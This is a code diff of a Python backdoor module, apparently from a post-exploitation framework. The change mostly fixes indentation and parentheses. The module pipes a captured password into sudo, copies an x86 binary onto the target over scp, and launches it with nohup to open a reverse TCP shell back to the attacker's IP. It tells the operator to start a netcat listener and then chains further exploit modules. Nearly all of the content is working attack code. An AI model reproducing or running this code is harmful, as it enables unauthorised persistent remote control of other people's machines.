@@ -15,18 +15,16 @@ class x86(Backdoor):
         self.help_text = "A binary that should run on many x86 platforms allowing for a reverse tcp shell"
 
     def get_command(self):
-		return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./x86 " + self.core.localIP + " " + str(self.get_value("port")
+	return "echo " + self.core.curtarget.pword + " | sudo -S nohup ./x86 " + self.core.localIP + " " + str(self.get_value("port"))
 
     def do_exploit(self, args):
-		raw_input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port"))
-		target.ssh.exec_command('rm x86')
-		target.scpFiles(self, 'backdoors/shell/x86/x86', False)
-		print(GOOD + "Moving the backdoor program")
-		target.ssh.exec_command(self.get_command())
-		print(GOOD + "Python backdoor on %s attempted." % port)
+	raw_input("Run the following command: nc -vnlp %s in another shell" % str(self.get_value("port")))
+	target.ssh.exec_command('rm x86')
+	target.scpFiles(self, 'backdoors/shell/x86/x86', False)
+	print(GOOD + "Moving the backdoor program")
+	target.ssh.exec_command(self.get_command())
+	print(GOOD + "Python backdoor on %s attempted." % port)
 		
-		for mod in self.modules.keys():
-			print(INFO + "Attempting to execute " + mod.name + " module...")
-			mod.exploit()
-
-
+	for mod in self.modules.keys():
+		print(INFO + "Attempting to execute " + mod.name + " module...")
+		mod.exploit()
